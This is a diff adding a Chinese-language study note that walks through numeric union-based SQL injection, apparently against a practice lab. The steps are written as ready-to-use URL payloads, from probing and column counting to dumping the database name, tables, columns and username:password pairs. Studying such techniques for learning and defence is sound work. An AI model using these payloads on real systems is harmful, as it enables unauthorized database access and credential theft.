@@ -1,3 +1,22 @@
+# 数字型注入(不许要单引号闭合)
+
+# 1、测试注入点
+## `?id=1'` :页面报错,说明单引号会破坏结构
+## `?id=1 and 1=1`(页面正常);`?id=1 and 1=2`(页面查不到数据)
+## 确认是数字型注入,不需要单引号闭合
+# 2、判断字段数
+## `?id=1 order by 3 --+`(正常);`?id=1 order by 4 --+`(报错);说明是3个字段
+# 3、联合查询找显示位
+## `?id=-1 union select 1,2,3 --+`(页面回显2和3)
+# 4、爆库名和版本
+## `?id=-1 union select 1,database(),version() --+`
+# 5、爆表名
+## `?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`(页面回显emails,referers,uagents,users)
+# 6、爆列名
+## `?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`(页面回显id,username,password)
+## 'users'是字符串要保留单引号
+# 7、爆账号密码
+## `?id=-a union select 1,group_concat(username,0x3a,password),3 from users --+`
 
 
 
